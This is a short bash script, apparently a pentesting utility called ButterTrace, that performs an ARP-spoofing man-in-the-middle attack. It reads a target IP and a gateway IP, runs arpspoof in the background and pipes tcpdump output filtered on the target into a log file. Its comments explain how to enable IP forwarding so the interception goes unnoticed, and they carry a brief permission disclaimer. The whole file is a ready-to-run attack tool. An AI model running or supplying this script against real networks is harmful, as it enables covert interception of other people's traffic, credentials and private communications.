#!/bin/bash

# ButterTrace - a small script that uses arpspoofing in order to sniff all network
# traffic originating from the target device.

# This script essentially allows you to perform a Man-in-the-Middle attack on the
# target machine. Only use this script on systems you have permission to run these
# types of actions on. Do NOT use this script for illegal purposes.

# Admin priviliges are required to run this script.

# This script depends on the commands 'arpspoof' and 'tcpdump' executing their 
# respective applications, this occurs as default with most pentesting distributions.

# When this script closes, it will terminate all spoofing and packet monitoring.
# If you require this script to continue running in the background, please use a tool
# such as 'screen'.

# IMPORTANT! It is highly recommended that IP Forwarding is enabled on the system 
# running this script, otherwise the packets from the target system will not hit 
# its destination - e.g. target system tries to visit a website, it fails because
# the packets are dying when they hit this system. IP Forwarding enabled will 
# allow traffic to pass to its intended destination once its hit the system.

# On most Unix/Linux systems you can enable IP Forwarding by amending the below file:
# /proc/sys/net/ipv4/ip_forward - setting it from 0 to 1 will enable forwarding.
# It is YOUR responsiblity to ensure it is safe to enable IP forwarding on your system.

# Requirements
# =============
# arpspoof
# tcpdump
# grep
# IP Forwarding enabled

# All network traffic from the target machine will be logged in the log file 'tcpdump-$target.txt'

printf "Please specify the target IP address... \n"
read target 

printf "Please specify the Gateway IP for this network...\n"
read gateway

sleep 1

printf "ARP Spoofing in-progress. $target should now believe you are $gateway \n"
printf "All network traffic from the target machine will be logged in the log file 'tcpdump-$target.txt' \n"

sleep 5

arpspoof -t $target $gateway &

tcpdump -v | grep "$target" > tcpdump-$target.txt
